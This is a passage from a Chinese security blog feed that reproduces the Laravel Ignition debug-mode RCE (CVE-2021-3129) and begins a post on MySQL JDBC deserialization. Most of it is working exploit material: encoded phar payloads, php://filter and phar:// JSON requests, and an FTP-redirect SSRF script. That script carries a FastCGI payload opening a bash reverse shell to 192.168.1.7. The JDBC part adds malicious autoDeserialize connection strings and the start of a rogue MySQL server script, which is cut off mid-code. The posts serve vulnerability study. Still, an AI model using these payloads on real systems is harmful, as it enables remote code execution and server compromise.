class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=52</span>=<span class="hljs-number">00=32=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=68=00=64</span>=<span class="hljs-number">00=47=00=39</span>=<span class="hljs-number">00=79=00=58</span>=<span class="hljs-number">00=45=00=31</span>=<span class="hljs-number">00=76=00=59</span>=<span class="hljs-number">00=32=00=74</span>=<span class="hljs-number">00=44=00=62</span>=<span class="hljs-number">00=32=00=35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=64=00=31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=46=00=30</span>=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=39=00=75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=63=00=36</span>=<span class="hljs-number">00=49=00=67</span>=<span class="hljs-number">00=41=00=71</span>=<span class="hljs-number">00=41=00=47</span>=<span class="hljs-number">00=35=00=68</span>=<span class="hljs-number">00=62=00=57</span>=<span class="hljs-number">00=55=00=69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=79=00=49</span>=<span class="hljs-number">00=37=00=66</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=41=00=59</span>=<span class="hljs-number">00=32=00=39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=53=00=49</span>=<span class="hljs-number">00=37=00=63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=50</span>=<span class="hljs-number">00=44=00=39</span>=<span class="hljs-number">00=77=00=61</span>=<span class="hljs-number">00=48=00=41</span>=<span class="hljs-number">00=67=00=63</span>=<span class="hljs-number">00=47=00=68</span>=<span class="hljs-number">00=77=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=62=00=79</span>=<span class="hljs-number">00=67=00=70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=79=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=65=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=79=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00=50=00=69</span>=<span class="hljs-number">00=49=00=37</span>=<span class="hljs-number">00=66=00=58</span>=<span class="hljs-number">00=31=00=39</span>=<span class="hljs-number">00=42=00=51</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=47</span>=<span class="hljs-number">00=52=00=31</span>=<span class="hljs-number">00=62=00=57</span>=<span class="hljs-number">00=31=00=35</span>=<span class="hljs-number">00=42=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">71</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00=42=00=57</span>=<span class="hljs-number">00=41=00=45</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=44=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>C=<span class="hljs-number">00=59=00=42</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=43=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=33</span>=<span class="hljs-number">00=51=00=75</span>=<span class="hljs-number">00=64=00=48</span>=<span class="hljs-number">00=68=00=30</span>=<span class="hljs-number">00=42=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">71</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00=42=00=57</span>=<span class="hljs-number">00=41=00=45</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=44=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>C=<span class="hljs-number">00=59=00=42</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=64=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=64=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=33</span>=<span class="hljs-number">00=52=00=64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00=31=00=70</span>=<span class="hljs-number">00=52=00=49</span>=<span class="hljs-number">00=71=00=57</span>=<span class="hljs-number">00=72=00=36</span>=<span class="hljs-number">00=77=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=38=00=30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00=57=00=61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=67=00=49</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=42</span>=<span class="hljs-number">00=48=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=43</span>=<span class="hljs-number">00</span>a&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>5.</p><p>清空log文件中的干扰字符，只留下payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-attr">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-attr">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>6.</p><p>触发phar反序列化</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-attr">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-attr">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;phar:///src/storage/logs/laravel.log/test.txt&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行成功</p><p><a href="https://imgtu.com/i/4sMb38"><img src="https://z3.ax1x.com/2021/09/25/4sMb38.png" alt="4sMb38.png"></a></p><h2 id="与FTP-SSRF结合"><a href="#与FTP-SSRF结合" class="headerlink" title="与FTP SSRF结合"></a>与FTP SSRF结合</h2><p>file_get_contents的参数可控，可以进行ssrf</p><p>由于file_get_contents不支持gopher协议，所以需要利用ftp的被动模式来”中转”一下</p><p>用gopherus生成的payload替换脚本里的payload，然后运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Time    : 2021/1/13 6:56 下午</span><br><span class="hljs-comment"># @Author  : tntaxin</span><br><span class="hljs-comment"># @File    : ftp_redirect.py</span><br><span class="hljs-comment"># @Software:</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><br><span class="hljs-comment"># 对gopherus生成的payload进行一次urldecode</span><br>payload = unquote(<span class="hljs-string">&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;</span>)<br>payload = payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>port = <span class="hljs-number">23</span><br>sk = socket.socket()<br>sk.bind((host, port))<br>sk.listen(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment"># ftp被动模式的passvie port,监听到1234</span><br>sk2 = socket.socket()<br>sk2.bind((host, <span class="hljs-number">1234</span>))<br>sk2.listen()<br><br><span class="hljs-comment"># 计数器，用于区分是第几次ftp连接</span><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    conn, address = sk.accept()<br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    print(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># USER aaa\r\n  客户端传来用户名</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;220 ready\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 ready\n&quot;</span>)<br><br>    print(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;215 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br><br>    print(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># SIZE /123\r\n  客户端询问文件/123的大小</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;213 3 \n&quot;</span>)  <br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;300 \n&quot;</span>)<br><br>    print(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># EPSV\r\n&#x27;</span><br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br><br>    print(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 127,0,0,1,4,210\n&quot;</span>)  <span class="hljs-comment"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span><br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 127,0,0,1,35,40\n&quot;</span>)  <span class="hljs-comment"># 端口计算规则：35*256+40=9000</span><br><br>    print(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;125 \n&quot;</span>) <span class="hljs-comment"># 告诉客户端可以开始数据连接了</span><br>        <span class="hljs-comment"># 新建一个socket给服务端返回我们的payload</span><br>        print(<span class="hljs-string">&quot;建立连接!&quot;</span>)<br>        conn2, address2 = sk2.accept()<br>        conn2.send(payload)<br>        conn2.close()<br>        print(<span class="hljs-string">&quot;断开连接!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;150 \n&quot;</span>)<br>        print(conn.recv(<span class="hljs-number">20</span>))<br>        exit()<br><br>    <span class="hljs-comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;226 \n&quot;</span>)<br>    conn.close()<br>    count += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>发送payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-attr">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-attr">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;ftp://aaa@192.168.1.7:23/123&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><code>/vendor/facade/ignition/src/Solutions/GenerateAppKeySolution.php</code></p><p>debug模式使用了ignition组件来美化堆栈信息，除此之外，ignition还附带了“一键修复bug”的功能，例如：如果我们我们刚才搭建环境的时候出现的那个“未指定应用加密密钥”的报错，我们仅仅点击了“Generate app key”这个按钮，便成功将这个bug修复了。</p><p><a href="https://imgtu.com/i/4sMhBd"><img src="https://z3.ax1x.com/2021/09/25/4sMhBd.png" alt="4sMhBd.png"></a></p><p><code>vendor\facade\ignition\src\Http\Controllers\ExecuteSolutionController.php</code></p><ol><li>先通过getRunnableSolution()方法获取到相应的solution名，</li><li>然后调用solution对象中的<code>run()</code>方法，并将获取的可控的<code>parameters</code>参数传过去。</li><li>调用 <code>MakeViewVariableOptionalSolution::run()</code> </li></ol><p><a href="https://imgtu.com/i/4sM4HA"><img src="https://z3.ax1x.com/2021/09/25/4sM4HA.png" alt="4sM4HA.png"></a></p><p><code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code></p><p>调用file_get_contents且参数可控</p><p><a href="https://imgtu.com/i/4sMg1O"><img src="https://z3.ax1x.com/2021/09/25/4sMg1O.png" alt="4sMg1O.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[Laravel Debug mode RCE（CVE-2021-3129）漏洞复现 | WHOAMI’s Blog (whoamianony.top)](<a href="https://whoamianony.top/2021/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Laravel/Laravel">https://whoamianony.top/2021/01/15/漏洞复现/Laravel/Laravel</a> Debug mode RCE（CVE-2021-3129）利用复现/)</p><p><a href="https://ma4ter.cn/2573.html">https://ma4ter.cn/2573.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JDBC反序列化学习</title>
    <link href="/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://downloads.mysql.com/archives/c-j/">https://downloads.mysql.com/archives/c-j/</a></p><p><a href="https://imgtu.com/i/4turAs"><img src="https://z3.ax1x.com/2021/09/21/4turAs.png" alt="4turAs.png"></a></p><p>把下载的jar包添加到依赖里</p><p><a href="https://imgtu.com/i/4tu0BQ"><img src="https://z3.ax1x.com/2021/09/21/4tu0BQ.png" alt="4tu0BQ.png"></a></p><p>在pom.xml中添加common-collections依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="触发链接"><a href="#触发链接" class="headerlink" title="触发链接"></a>触发链接</h1><h2 id="ServerStatusDiffInterceptor触发"><a href="#ServerStatusDiffInterceptor触发" class="headerlink" title="ServerStatusDiffInterceptor触发"></a>ServerStatusDiffInterceptor触发</h2><ul><li><strong>8.x:</strong> <code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></li><li><strong>6.x(属性名不同):</strong> <code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></li><li><strong>5.1.11及以上的5.x版本（包名没有了cj）:</strong><code> jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></li><li><strong>5.1.10及以下的5.1.X版本：</strong> 同上，但是需要连接后执行查询。</li><li><strong>5.0.x:</strong> 还没有<code>ServerStatusDiffInterceptor</code>这个东西┓( ´∀` )┏</li></ul><h2 id="detectCustomCollations触发"><a href="#detectCustomCollations触发" class="headerlink" title="detectCustomCollations触发"></a>detectCustomCollations触发</h2><ul><li><strong>5.1.41及以上:</strong> 不可用</li><li><strong>5.1.29-5.1.40:</strong> <code>jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</code></li><li><strong>5.1.28-5.1.19：</strong> <code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</code></li><li><strong>5.1.18以下的5.1.x版本：</strong> 不可用</li><li><strong>5.0.x版本不可用</strong></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>运行恶意mysql服务器脚本</p><p>来源：<a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br>greeting_data=<span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br>response_ok_data=<span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">receive_data</span>(<span class="hljs-params">conn</span>):</span><br>    data = conn.recv(<span class="hljs-number">1024</span>)<br>    